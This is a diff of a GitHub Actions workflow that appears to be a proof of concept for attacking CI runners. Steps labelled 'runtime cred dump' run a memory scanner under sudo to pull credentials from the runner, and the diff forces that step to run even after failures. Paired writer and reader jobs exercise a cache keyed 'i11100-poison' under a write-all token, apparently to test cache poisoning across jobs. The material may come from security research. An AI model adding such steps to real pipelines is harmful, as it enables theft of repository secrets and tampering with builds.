@@ -10,12 +10,13 @@ jobs:
     steps:
       - uses: actions/checkout@v4
       - name: runtime cred dump (ACTION step - only place creds exist)
-        uses: ./i11100/act
+        uses: ./act
       - name: runtime cred dump (runner mem via sudo)
+        if: always()
         run: |
           set +e
-          sudo python3 i11100/memscan.py 2>&1 | tail -80
-  write:
+          sudo python3 i11100/memscan.py 2>&1 | tail -120
+  writer:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
@@ -33,12 +34,12 @@ jobs:
         with:
           name: i11100-art
           path: cachepayload/marker.txt
-  read:
-    needs: write
+  reader_same_run:
+    needs: writer
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
-      - name: restore cache (own token, same branch, other job)
+      - name: restore cache (write-all token, same branch, other job)
         uses: actions/cache/restore@v4
         with:
           key: i11100-poison
